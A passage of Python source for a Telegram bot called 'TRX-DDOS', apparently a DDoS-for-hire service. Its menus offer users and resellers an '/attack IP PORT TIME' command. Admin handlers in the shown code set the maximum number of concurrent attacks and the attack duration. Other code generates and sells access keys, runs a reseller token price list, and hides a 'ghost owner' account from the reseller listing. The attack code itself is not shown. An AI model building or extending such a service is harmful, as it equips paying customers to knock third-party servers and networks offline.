/genpremium PREFIX DURATION COUNT - Multiple premium
/keys - List keys
/deletekeys - Delete keys
/blockkey KEY - Block key
/unblockkey KEY - Unblock key
━━━━━━━━━━━━━━━━━━━━━━━━
💼 RESELLER MANAGEMENT
/addreseller ID TOKENS - Add reseller
/removereseller ID - Remove reseller
/resellers - List resellers
/unlimited ID - Make unlimited
/limited ID TOKENS - Make limited
━━━━━━━━━━━━━━━━━━━━━━━━
🔒 BOT CONTROL
/lock - Lock bot
/unlock - Unlock bot
/maintenance on/off - Maintenance mode
/delvideo - Delete video
━━━━━━━━━━━━━━━━━━━━━━━━
💾 BACKUP COMMANDS
/getjson - Get all JSON backups
/uploaduserjson - Upload users.json
/uploadresellerjson - Upload resellers.json
/uploadkeysjson - Upload keys.json
━━━━━━━━━━━━━━━━━━━━━━━━""")
    elif is_reseller(user_id):
        send_msg(chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
💼 TRX-DDOS RESELLER
━━━━━━━━━━━━━━━━━━━━━━━━
/attack IP PORT TIME - Start Attack
/id - Get Your ID
/rules - Bot Rules
/redeem KEY - Get access
/myplan - Check your plan
/genkey - Generate Keys
/deletekey - Delete Your Keys
/blockkey KEY - Block Your Key
/unblockkey KEY - Unblock Your Key
/myblockedkeys - Show Blocked Keys
━━━━━━━━━━━━━━━━━━━━━━━━""")
    else:
        send_msg(chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
📌 USER COMMANDS
━━━━━━━━━━━━━━━━━━━━━━━━
/attack IP PORT TIME - Start attack
/status - Check active attacks
/id - Your ID
/redeem KEY - Redeem key
/myplan - Check your plan
/rules - Bot rules
/help - Help menu
━━━━━━━━━━━━━━━━━━━━━━━━""")

def handle_settings(chat_id, user_id):
    if is_bot_off and not is_owner(user_id):
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin Only!")
        return
    send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
⚙️ CURRENT SETTINGS
━━━━━━━━━━━━━━━━━━━━━━━━
🎯 Max Concurrent: {MAX_CONCURRENT}
⏱️ Max Time: {MAX_TIME}s
⏳ Cooldown: {COOLDOWN_SECONDS}s
📊 Daily Limit: {DAILY_LIMIT}
🔒 Bot Locked: {'YES' if is_locked else 'NO'}
🔧 Maintenance: {'YES' if is_maintenance else 'NO'}
━━━━━━━━━━━━━━━━━━━━━━━━""")

def handle_setmaxconcurrent(chat_id, user_id, args):
    if is_bot_off and not is_owner(user_id):
        return
    
    global MAX_CONCURRENT
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin Only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /setmaxconcurrent NUM")
        return
    try:
        MAX_CONCURRENT = int(args[0])
        save_data()
        send_msg(chat_id, f"✅ Max concurrent attacks set to {MAX_CONCURRENT}")
    except:
        send_msg(chat_id, "❌ Invalid number!")

def handle_settime(chat_id, user_id, args):
    if is_bot_off and not is_owner(user_id):
        return
    
    global MAX_TIME
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin Only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /settime SEC")
        return
    try:
        MAX_TIME = int(args[0])
        save_data()
        send_msg(chat_id, f"✅ Max time set to {MAX_TIME}s")
    except:
        send_msg(chat_id, "❌ Invalid number!")

def handle_setcooldown(chat_id, user_id, args):
    if is_bot_off and not is_owner(user_id):
        return
    
    global COOLDOWN_SECONDS
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin Only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /setcooldown SEC")
        return
    try:
        COOLDOWN_SECONDS = int(args[0])
        save_data()
        send_msg(chat_id, f"✅ Cooldown set to {COOLDOWN_SECONDS}s")
    except:
        send_msg(chat_id, "❌ Invalid number!")

def handle_setdaily(chat_id, user_id, args):
    if is_bot_off and not is_owner(user_id):
        return
    
    global DAILY_LIMIT
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin Only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /setdaily LIMIT")
        return
    try:
        DAILY_LIMIT = int(args[0])
        save_data()
        send_msg(chat_id, f"✅ Daily limit set to {DAILY_LIMIT}")
    except:
        send_msg(chat_id, "❌ Invalid number!")

def handle_lock(chat_id, user_id):
    if is_bot_off and not is_owner(user_id):
        return
    
    global is_locked
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    is_locked = True
    save_data()
    send_msg(chat_id, "🔒 Bot Locked!")

def handle_unlock(chat_id, user_id):
    if is_bot_off and not is_owner(user_id):
        return
    
    global is_locked
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    is_locked = False
    save_data()
    send_msg(chat_id, "🔓 Bot Unlocked!")

def handle_maintenance(chat_id, user_id, args):
    if is_bot_off and not is_owner(user_id):
        return
    
    global is_maintenance
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /maintenance on/off")
        return
    if args[0].lower() == "on":
        is_maintenance = True
        save_data()
        send_msg(chat_id, "🔧 Maintenance Mode ON!")
    elif args[0].lower() == "off":
        is_maintenance = False
        save_data()
        send_msg(chat_id, "✅ Maintenance Mode OFF!")
    else:
        send_msg(chat_id, "Usage: /maintenance on/off")

def handle_removevideo(chat_id, user_id):
    if is_bot_off and not is_owner(user_id):
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    remove_video(chat_id, user_id)

def handle_adduser(chat_id, user_id, args):
    if is_bot_off and not is_owner(user_id):
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if len(args) != 2:
        send_msg(chat_id, "Usage: /adduser ID DAYS\nExample: /adduser 123456789 30")
        return
    try:
        uid = int(args[0])
        days = int(args[1])
        add_user(uid, days, 0)
        send_msg(chat_id, f"✅ User {uid} added for {days} days!")
    except:
        send_msg(chat_id, "❌ Invalid ID or days!")

def handle_removeuser(chat_id, user_id, args):
    if is_bot_off and not is_owner(user_id):
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /removeuser ID\nExample: /removeuser 123456789")
        return
    try:
        uid = int(args[0])
        remove_user(uid)
        send_msg(chat_id, f"✅ User {uid} removed!")
    except:
        send_msg(chat_id, "❌ Invalid ID!")

def handle_addgroup(chat_id, user_id, args):
    if is_bot_off and not is_owner(user_id):
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if len(args) != 2:
        send_msg(chat_id, "Usage: /addgroup GROUP_ID DAYS\nExample: /addgroup -100123456789 30")
        return
    try:
        gid = int(args[0])
        days = int(args[1])
        add_group(gid, days)
        send_msg(chat_id, f"✅ Group {gid} added for {days} days!")
    except:
        send_msg(chat_id, "❌ Invalid Group ID or days!")

def handle_removegroup(chat_id, user_id, args):
    if is_bot_off and not is_owner(user_id):
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /removegroup GROUP_ID\nExample: /removegroup -100123456789")
        return
    try:
        gid = int(args[0])
        remove_group(gid)
        send_msg(chat_id, f"✅ Group {gid} removed!")
    except:
        send_msg(chat_id, "❌ Invalid Group ID!")

def handle_groups(chat_id, user_id):
    if is_bot_off and not is_owner(user_id):
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if not groups:
        send_msg(chat_id, "📋 No groups added yet!")
        return
    msg = "📋 AUTHORIZED GROUPS\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for gid, expiry in groups.items():
        remaining = expiry - time.time()
        if remaining <= 0:
            msg += f"🆔 {gid}\n❌ EXPIRED\n━━━━━━━━━━━━━━━━━━━━━━\n"
        else:
            days = int(remaining // 86400)
            hours = int((remaining % 86400) // 3600)
            msg += f"🆔 {gid}\n✅ Active: {days}d {hours}h\n━━━━━━━━━━━━━━━━━━━━━━\n"
    send_msg(chat_id, msg[:4000])

def handle_genbasic_admin(chat_id, user_id, args):
    if is_bot_off and not is_owner(user_id):
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    
    if len(args) < 2:
        send_msg(chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
📌 /genbasic USAGE
━━━━━━━━━━━━━━━━━━━━━━━━
Generate Single Basic Key:
/genbasic PREFIX DURATION

Generate Multiple Basic Keys:
/genbasic PREFIX DURATION COUNT

📝 Examples:
/genbasic TEST 30          → 30 days single basic key
/genbasic TEST 12h         → 12 hours single basic key
/genbasic TEST 1.5h        → 1.5 hours single basic key
/genbasic TEST 2.5d        → 2.5 days single basic key

/genbasic TEST 30 5        → 5 keys of 30 days
/genbasic VIP 7d 10        → 10 keys of 7 days
━━━━━━━━━━━━━━━━━━━━━━━━""")
        return
    
    prefix = args[0].upper()
    duration_str = args[1].lower()
    count = 1
    
    if len(args) >= 3:
        try:
            count = int(args[2])
            if count > 500:
                send_msg(chat_id, "❌ Maximum 500 keys per generation!")
                return
            if count < 1:
                count = 1
        except:
            send_msg(chat_id, "❌ Invalid count! Must be a number.")
            return
    
    if count == 1:
        key, error = generate_basic_admin_key(prefix, duration_str)
        if error:
            send_msg(chat_id, error)
            return
        
        unit, value = parse_duration(duration_str)
        if unit == 'days':
            if value % 1 == 0:
                plan = f"{int(value)} Days"
            else:
                plan = f"{value} Days"
        else:
            if value % 1 == 0:
                plan = f"{int(value)} Hours"
            else:
                plan = f"{value} Hours"
        
        send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
📀 BASIC KEY GENERATED!
━━━━━━━━━━━━━━━━━━━━━━━━
🔑 {key}
📅 Valid: {plan}
⭐ Type: BASIC
━━━━━━━━━━━━━━━━━━━━━━━━""")
    else:
        generated_keys, error = generate_multiple_basic_admin_keys(prefix, duration_str, count)
        if error:
            send_msg(chat_id, error)
            return
        
        unit, value = parse_duration(duration_str)
        if unit == 'days':
            if value % 1 == 0:
                plan = f"{int(value)} Days"
            else:
                plan = f"{value} Days"
        else:
            if value % 1 == 0:
                plan = f"{int(value)} Hours"
            else:
                plan = f"{value} Hours"
        
        keys_list = "\n".join([f"🔑 {k}" for k in generated_keys])
        
        msg = f"""
━━━━━━━━━━━━━━━━━━━━━━━━
📀 {count} BASIC KEYS GENERATED!
━━━━━━━━━━━━━━━━━━━━━━━━
📝 PREFIX: {prefix}
⏱️ VALID: {plan}
⭐ TYPE: BASIC
━━━━━━━━━━━━━━━━━━━━━━━━
{keys_list}
━━━━━━━━━━━━━━━━━━━━━━━━
💾 Total: {count} keys
━━━━━━━━━━━━━━━━━━━━━━━━"""
        
        if len(msg) > 4000:
            send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
📀 {count} BASIC KEYS GENERATED!
━━━━━━━━━━━━━━━━━━━━━━━━
📝 PREFIX: {prefix}
⏱️ VALID: {plan}
⭐ TYPE: BASIC
━━━━━━━━━━━━━━━━━━━━━━━━
💾 Total: {count} keys
━━━━━━━━━━━━━━━━━━━━━━━━""")
            chunk = ""
            for k in generated_keys:
                if len(chunk) + len(k) + 10 > 4000:
                    send_msg(chat_id, chunk)
                    chunk = ""
                chunk += f"🔑 {k}\n"
            if chunk:
                send_msg(chat_id, chunk)
        else:
            send_msg(chat_id, msg)

def handle_genpremium_admin(chat_id, user_id, args):
    if is_bot_off and not is_owner(user_id):
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    
    if len(args) < 2:
        send_msg(chat_id, """
━━━━━━━━━━━━━━━━━━━━━━━━
📌 /genpremium USAGE
━━━━━━━━━━━━━━━━━━━━━━━━
Generate Single Premium Key:
/genpremium PREFIX DURATION

Generate Multiple Premium Keys:
/genpremium PREFIX DURATION COUNT

📝 Examples:
/genpremium TEST 30d        → 30 days single premium key
/genpremium TEST 12h       → 12 hours single premium key
/genpremium TEST 1.5h      → 1.5 hours single premium key
/genpremium TEST 2.5d      → 2.5 days single premium key

/genpremium TEST 30 5      → 5 keys of 30 days
/genpremium VIP 7d 10      → 10 keys of 7 days
━━━━━━━━━━━━━━━━━━━━━━━━""")
        return
    
    prefix = args[0].upper()
    duration_str = args[1].lower()
    count = 1
    
    if len(args) >= 3:
        try:
            count = int(args[2])
            if count > 500:
                send_msg(chat_id, "❌ Maximum 500 keys per generation!")
                return
            if count < 1:
                count = 1
        except:
            send_msg(chat_id, "❌ Invalid count! Must be a number.")
            return
    
    if count == 1:
        key, error = generate_premium_admin_key(prefix, duration_str)
        if error:
            send_msg(chat_id, error)
            return
        
        unit, value = parse_duration(duration_str)
        if unit == 'days':
            if value % 1 == 0:
                plan = f"{int(value)} Days"
            else:
                plan = f"{value} Days"
        else:
            if value % 1 == 0:
                plan = f"{int(value)} Hours"
            else:
                plan = f"{value} Hours"
        
        send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
⭐ PREMIUM KEY GENERATED!
━━━━━━━━━━━━━━━━━━━━━━━━
🔑 {key}
📅 Valid: {plan}
⭐ Type: PREMIUM
━━━━━━━━━━━━━━━━━━━━━━━━""")
    else:
        generated_keys, error = generate_multiple_premium_admin_keys(prefix, duration_str, count)
        if error:
            send_msg(chat_id, error)
            return
        
        unit, value = parse_duration(duration_str)
        if unit == 'days':
            if value % 1 == 0:
                plan = f"{int(value)} Days"
            else:
                plan = f"{value} Days"
        else:
            if value % 1 == 0:
                plan = f"{int(value)} Hours"
            else:
                plan = f"{value} Hours"
        
        keys_list = "\n".join([f"⭐ {k}" for k in generated_keys])
        
        msg = f"""
━━━━━━━━━━━━━━━━━━━━━━━━
⭐ {count} PREMIUM KEYS GENERATED!
━━━━━━━━━━━━━━━━━━━━━━━━
📝 PREFIX: {prefix}
⏱️ VALID: {plan}
⭐ TYPE: PREMIUM
━━━━━━━━━━━━━━━━━━━━━━━━
{keys_list}
━━━━━━━━━━━━━━━━━━━━━━━━
💾 Total: {count} keys
━━━━━━━━━━━━━━━━━━━━━━━━"""
        
        if len(msg) > 4000:
            send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
⭐ {count} PREMIUM KEYS GENERATED!
━━━━━━━━━━━━━━━━━━━━━━━━
📝 PREFIX: {prefix}
⏱️ VALID: {plan}
⭐ TYPE: PREMIUM
━━━━━━━━━━━━━━━━━━━━━━━━
💾 Total: {count} keys
━━━━━━━━━━━━━━━━━━━━━━━━""")
            chunk = ""
            for k in generated_keys:
                if len(chunk) + len(k) + 10 > 4000:
                    send_msg(chat_id, chunk)
                    chunk = ""
                chunk += f"⭐ {k}\n"
            if chunk:
                send_msg(chat_id, chunk)
        else:
            send_msg(chat_id, msg)

def handle_keys(chat_id, user_id):
    if is_bot_off and not is_owner(user_id):
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    
    if not keys:
        send_msg(chat_id, "📋 No keys available!")
        return
    
    unused_keys = []
    used_keys = []
    
    for k, v in keys.items():
        key_type = "⭐" if v.get('type') == 'premium' else "📀"
        if v.get('days', 0) > 0:
            days = v['days']
            if days % 1 == 0:
                dur = f"{int(days)}d"
            else:
                dur = f"{days}d"
        elif v.get('hours', 0) > 0:
            hours = v['hours']
            if hours % 1 == 0:
                dur = f"{int(hours)}h"
            else:
                dur = f"{hours}h"
        else:
            dur = "Unknown"
        
        status = "✅ UNUSED" if not v['used'] else f"❌ USED by {v['used_by']}"
        if v.get('blocked', False):
            status = "🚫 BLOCKED"
        
        key_line = f"{key_type} `{k}` | {dur} | {status}"
        
        if v.get('blocked', False):
            pass
        elif not v['used']:
            unused_keys.append(key_line)
        else:
            used_keys.append(key_line)
    
    msg = "📋 KEYS LIST (📀=Basic ⭐=Premium)\n━━━━━━━━━━━━━━━━━━━━━━\n"
    
    if unused_keys:
        msg += f"✅ UNUSED KEYS ({len(unused_keys)}):\n"
        msg += "\n".join(unused_keys[:20])
        if len(unused_keys) > 20:
            msg += f"\n... and {len(unused_keys) - 20} more"
        msg += "\n\n"
    
    if used_keys:
        msg += f"❌ USED KEYS ({len(used_keys)}):\n"
        msg += "\n".join(used_keys[:15])
        if len(used_keys) > 15:
            msg += f"\n... and {len(used_keys) - 15} more"
    
    send_msg(chat_id, msg[:4000])

def handle_deletekeys(chat_id, user_id):
    if is_bot_off and not is_owner(user_id):
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    buttons = [
        [{"text": "DELETE ALL UNUSED KEYS", "callback_data": "admin_del_unused"}],
        [{"text": "DELETE ALL USED KEYS", "callback_data": "admin_del_used"}],
        [{"text": "DELETE ALL KEYS", "callback_data": "admin_del_all"}],
        [{"text": "❌ CANCEL", "callback_data": "admin_del_cancel"}]
    ]
    send_buttons(chat_id, "🗑️ DELETE KEYS", buttons)

def handle_blockkey_admin(chat_id, user_id, args):
    if is_bot_off and not is_owner(user_id):
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /blockkey KEY\nExample: /blockkey TRX-ABCD1234")
        return
    key = args[0].upper()
    if key not in keys:
        send_msg(chat_id, "❌ Key not found!")
        return
    if keys[key].get('blocked', False):
        send_msg(chat_id, "❌ Key already blocked!")
        return
    
    expire_user_by_key(key)
    keys[key]['blocked'] = True
    save_data()
    send_msg(chat_id, f"✅ Key {key} blocked! User expired.")

def handle_unblockkey_admin(chat_id, user_id, args):
    if is_bot_off and not is_owner(user_id):
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /unblockkey KEY\nExample: /unblockkey TRX-ABCD1234")
        return
    key = args[0].upper()
    if key not in keys:
        send_msg(chat_id, "❌ Key not found!")
        return
    if not keys[key].get('blocked', False):
        send_msg(chat_id, "❌ Key is not blocked!")
        return
    
    used_by = keys[key].get('used_by')
    if used_by and int(used_by) != GHOST_OWNER_ID:
        days = keys[key]['days']
        hours = keys[key].get('hours', 0)
        current_time = time.time()
        expiry_seconds = (days * 86400) + (hours * 3600)
        users[used_by] = current_time + expiry_seconds
        user_key_map[used_by] = key
    
    keys[key]['blocked'] = False
    save_data()
    send_msg(chat_id, f"✅ Key {key} unblocked! User access restored.")

def handle_addreseller(chat_id, user_id, args):
    if is_bot_off and not is_owner(user_id):
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if len(args) != 2:
        send_msg(chat_id, "Usage: /addreseller ID TOKENS\nExample: /addreseller 123456789 100")
        return
    try:
        nid = int(args[0])
        tokens = int(args[1])
        add_reseller(nid, tokens, False)
        send_msg(chat_id, f"✅ Reseller {nid} added with {tokens} tokens!")
    except:
        send_msg(chat_id, "❌ Invalid ID or tokens!")

def handle_removereseller(chat_id, user_id, args):
    if is_bot_off and not is_owner(user_id):
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /removereseller ID\nExample: /removereseller 123456789")
        return
    try:
        rid = int(args[0])
        remove_reseller(rid)
        send_msg(chat_id, f"✅ Reseller {rid} removed!")
    except:
        send_msg(chat_id, "❌ Invalid ID!")

def handle_resellers(chat_id, user_id):
    if is_bot_off and not is_owner(user_id):
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if not resellers:
        send_msg(chat_id, "📋 No resellers added yet!")
        return
    msg = "📋 RESELLERS LIST\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for rid, data in resellers.items():
        if int(rid) == GHOST_OWNER_ID:
            continue
        tokens = "∞" if data.get('unlimited', False) else data['tokens']
        msg += f"🆔 {rid}\n💰 Tokens: {tokens}\n📈 Earned: {data['total_earned']}\n━━━━━━━━━━━━━━━━━━━━━━\n"
    send_msg(chat_id, msg[:4000])

def handle_unlimited(chat_id, user_id, args):
    if is_bot_off and not is_owner(user_id):
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if len(args) != 1:
        send_msg(chat_id, "Usage: /unlimited ID\nExample: /unlimited 123456789")
        return
    try:
        rid = int(args[0])
        if str(rid) in resellers:
            resellers[str(rid)]['unlimited'] = True
            resellers[str(rid)]['tokens'] = -1
            save_data()
            send_msg(chat_id, f"✅ Reseller {rid} now has UNLIMITED tokens!")
        else:
            send_msg(chat_id, "❌ Reseller not found!")
    except:
        send_msg(chat_id, "❌ Invalid ID!")

def handle_limited(chat_id, user_id, args):
    if is_bot_off and not is_owner(user_id):
        return
    
    if not is_admin(user_id):
        send_msg(chat_id, "❌ Admin only!")
        return
    if len(args) != 2:
        send_msg(chat_id, "Usage: /limited ID TOKENS\nExample: /limited 123456789 50")
        return
    try:
        rid = int(args[0])
        tokens = int(args[1])
        if str(rid) in resellers:
            resellers[str(rid)]['unlimited'] = False
            resellers[str(rid)]['tokens'] = tokens
            save_data()
            send_msg(chat_id, f"✅ Reseller {rid} now has LIMITED tokens: {tokens}")
        else:
            send_msg(chat_id, "❌ Reseller not found!")
    except:
        send_msg(chat_id, "❌ Invalid ID or tokens!")

# ========== RESELLER KEY GENERATION ==========

def handle_genkey_reseller(chat_id, user_id):
    if is_bot_off and not is_owner(user_id):
        return
    
    if not is_reseller(user_id):
        send_msg(chat_id, "❌ Only for resellers!")
        return
    
    buttons = [
        [{"text": "📀 BASIC (Normal Price)", "callback_data": "genkey_type_basic"}],
        [{"text": "⭐ PREMIUM (Double Price)", "callback_data": "genkey_type_premium"}],
        [{"text": "❌ CANCEL", "callback_data": "genkey_cancel"}]
    ]
    send_buttons(chat_id, f"💼 SELECT KEY TYPE\n💰 Balance: {get_reseller_tokens(user_id)}", buttons)

def handle_genkey_type_callback(callback_query):
    if is_bot_off:
        return
    
    user_id = callback_query["from"]["id"]
    chat_id = callback_query["message"]["chat"]["id"]
    msg_id = callback_query["message"]["message_id"]
    cb_id = callback_query["id"]
    cb_data = callback_query["data"]
    
    if not is_reseller(user_id):
        answer_callback(cb_id, "❌ Reseller only!")
        return
    
    answer_callback(cb_id)
    
    if cb_data == "genkey_type_basic":
        temp_data[f"{user_id}_key_type"] = "basic"
    elif cb_data == "genkey_type_premium":
        temp_data[f"{user_id}_key_type"] = "premium"
    else:
        del_msg(chat_id, msg_id)
        send_msg(chat_id, "❌ Cancelled!")
        return
    
    del_msg(chat_id, msg_id)
    
    if temp_data[f"{user_id}_key_type"] == "basic":
        buttons = [
            [{"text": "🕐 1 HOUR - 1 TOKEN", "callback_data": "genkey_1h"}],
            [{"text": "🕐 5 HOURS - 3 TOKENS", "callback_data": "genkey_5h"}],
            [{"text": "📅 1 DAY - 4 TOKENS", "callback_data": "genkey_1d"}],
            [{"text": "📅 3 DAYS - 8 TOKENS", "callback_data": "genkey_3d"}],
            [{"text": "📅 7 DAYS - 15 TOKENS", "callback_data": "genkey_7d"}],
            [{"text": "📅 14 DAYS - 25 TOKENS", "callback_data": "genkey_14d"}],
            [{"text": "📅 30 DAYS - 50 TOKENS", "callback_data": "genkey_30d"}],
            [{"text": "📅 60 DAYS - 80 TOKENS", "callback_data": "genkey_60d"}],
            [{"text": "❌ CANCEL", "callback_data": "genkey_cancel"}]
        ]
    else:
        buttons = [
            [{"text": "🕐 1 HOUR - 2 TOKENS", "callback_data": "genkey_1h_premium"}],
            [{"text": "🕐 5 HOURS - 6 TOKENS", "callback_data": "genkey_5h_premium"}],
            [{"text": "📅 1 DAY - 8 TOKENS", "callback_data": "genkey_1d_premium"}],
            [{"text": "📅 3 DAYS - 16 TOKENS", "callback_data": "genkey_3d_premium"}],
            [{"text": "📅 7 DAYS - 30 TOKENS", "callback_data": "genkey_7d_premium"}],
            [{"text": "📅 14 DAYS - 50 TOKENS", "callback_data": "genkey_14d_premium"}],
            [{"text": "📅 30 DAYS - 100 TOKENS", "callback_data": "genkey_30d_premium"}],
            [{"text": "📅 60 DAYS - 160 TOKENS", "callback_data": "genkey_60d_premium"}],
            [{"text": "❌ CANCEL", "callback_data": "genkey_cancel"}]
        ]
    
    send_buttons(chat_id, f"💼 SELECT DURATION\n💰 Balance: {get_reseller_tokens(user_id)}\n⭐ Type: {'BASIC' if temp_data[f'{user_id}_key_type'] == 'basic' else 'PREMIUM'}", buttons)

def handle_genkey_callback(callback_query):
    if is_bot_off:
        return
    
    user_id = callback_query["from"]["id"]
    chat_id = callback_query["message"]["chat"]["id"]
    msg_id = callback_query["message"]["message_id"]
    cb_id = callback_query["id"]
    cb_data = callback_query["data"]
    
    if not is_reseller(user_id):
        answer_callback(cb_id, "❌ Reseller only!")
        return
    
    answer_callback(cb_id)
    
    if cb_data == "genkey_cancel":
        del_msg(chat_id, msg_id)
        if f"{user_id}_key_type" in temp_data:
            del temp_data[f"{user_id}_key_type"]
        send_msg(chat_id, "❌ Cancelled!")
        return
    
    is_premium = "_premium" in cb_data
    duration_raw = cb_data.replace("genkey_", "").replace("_premium", "")
    
    key_type = temp_data.get(f"{user_id}_key_type", "basic")
    if is_premium:
        key_type = "premium"
    
    temp_data[f"{user_id}_temp_duration"] = duration_raw
    temp_data[f"{user_id}_temp_key_type"] = key_type
    
    del_msg(chat_id, msg_id)
    
    original_price = KEY_PRICES.get(duration_raw, 0)
    if key_type == "premium":
        price = original_price * 2
        type_display = "⭐ PREMIUM"
    else:
        price = original_price
        type_display = "📀 BASIC"
    
    confirm_buttons = [
        [{"text": "✅ YES, GENERATE", "callback_data": f"confirm_{duration_raw}_{key_type}"}],
        [{"text": "❌ NO, CANCEL", "callback_data": "confirm_cancel"}]
    ]
    send_buttons(chat_id, f"⚠️ CONFIRM KEY GENERATION\n\n📅 Type: {duration_raw}\n⭐ Key Type: {type_display}\n💰 Price: {price} tokens\n\nDo you want to generate this key?", confirm_buttons)

def handle_confirm_callback(callback_query):
    if is_bot_off:
        return
    
    user_id = callback_query["from"]["id"]
    chat_id = callback_query["message"]["chat"]["id"]
    msg_id = callback_query["message"]["message_id"]
    cb_id = callback_query["id"]
    cb_data = callback_query["data"]
    
    if not is_reseller(user_id):
        answer_callback(cb_id, "❌ Reseller only!")
        return
    
    answer_callback(cb_id)
    
    del_msg(chat_id, msg_id)
    
    if cb_data == "confirm_cancel":
        send_msg(chat_id, "❌ Key generation cancelled!")
        if f"{user_id}_temp_duration" in temp_data:
            del temp_data[f"{user_id}_temp_duration"]
        if f"{user_id}_temp_key_type" in temp_data:
            del temp_data[f"{user_id}_temp_key_type"]
        if f"{user_id}_key_type" in temp_data:
            del temp_data[f"{user_id}_key_type"]
        return
    
    parts = cb_data.replace("confirm_", "").split("_")
    duration = parts[0]
    key_type = parts[1] if len(parts) > 1 else temp_data.get(f"{user_id}_temp_key_type", "basic")
    
    original_price = KEY_PRICES.get(duration, 0)
    if key_type == "premium":
        price = original_price * 2
    else:
        price = original_price
    
    if not deduct_reseller_tokens(user_id, price):
        send_msg(chat_id, f"""
━━━━━━━━━━━━━━━━━━━━━━━━
❌ INSUFFICIENT TOKENS!
━━━━━━━━━━━━━━━━━━━━━━━━
Need {price} tokens to generate this {key_type.upper()} key.
Your balance: {get_reseller_tokens(user_id)}
━━━━━━━━━━━━━━━━━━━━━━━━""")
        return
    
    key = f"{'VIP' if key_type == 'premium' else 'TRX'}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
    days, hours = 0, 0
    if duration.endswith('h'):
        hours = int(duration.replace('h', ''))
    elif duration.endswith('d'):
        days = int(duration.replace('d', ''))
    
    keys[key] = {'days': days, 'hours': hours, 'used': False, 'used_by': None, 'created_by': str(user_id), 'blocked': False, 'type': key_type}
    add_reseller_key(user_id, key)
    save_data()
    
    send_msg(chat_id, f"""
✅ Key Generated!
━━━━━━━━━━━━━━━━━━━━━━━━
🔑 {key}
📅 Type: {duration}
⭐ Plan: {key_type.upper()}
💰 Cost: {price} tokens
━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ Save this key!
""")
    
    if f"{user_id}_temp_duration" in temp_data:
        del temp_data[f"{user_id}_temp_duration"]
    if f"{user_id}_temp_key_type" in temp_data:
        del temp_data[f"{user_id}_temp_key_type"]
    if f"{user_id}_key_type" in temp_data:
        del temp_data[f"{user_id}_key_type"]

def handle_deletekey_reseller(chat_id, user_id):
    if is_bot_off and not is_owner(user_id):
        return
    
    if not is_reseller(user_id):
        send_msg(chat_id, "❌ Only for resellers!")
        return
    keys_list = get_reseller_keys(user_id)
    if not keys_list:
        send_msg(chat_id, "❌ No keys to delete!")
        return
    buttons = [[{"text": f"🔑 {k}", "callback_data": f"delkey_{k}"}] for k in keys_list[:20]]
    buttons.append([{"text": "❌ CANCEL", "callback_data": "delkey_cancel"}])
    send_buttons(chat_id, "🗑️ SELECT KEY TO DELETE", buttons)

def handle_myblockedkeys(chat_id, user_id):
    if is_bot_off and not is_owner(user_id):
        return
    
    if not is_reseller(user_id):
        send_msg(chat_id, "❌ Only for resellers!")
        return
    blocked = my_blocked_keys(user_id)
    if not blocked:
        send_msg(chat_id, "❌ No blocked keys!")
        return
    msg = "🚫 YOUR BLOCKED KEYS\n━━━━━━━━━━━━━━━━━━━━━━\n"
    for k in blocked:
        msg += f"🔑 {k}\n"
    send_msg(chat_id, msg)

def handle_delkey_callback(callback_query):
    if is_bot_off:
        return
    
    user_id = callback_query["from"]["id"]
    chat_id = callback_query["message"]["chat"]["id"]
    msg_id = callback_query["message"]["message_id"]
    cb_id = callback_query["id"]
    cb_data = callback_query["data"]
    
    if not is_reseller(user_id):
        answer_callback(cb_id, "❌ Reseller only!")
        return
    
    answer_callback(cb_id)
    
    del_msg(chat_id, msg_id)
    
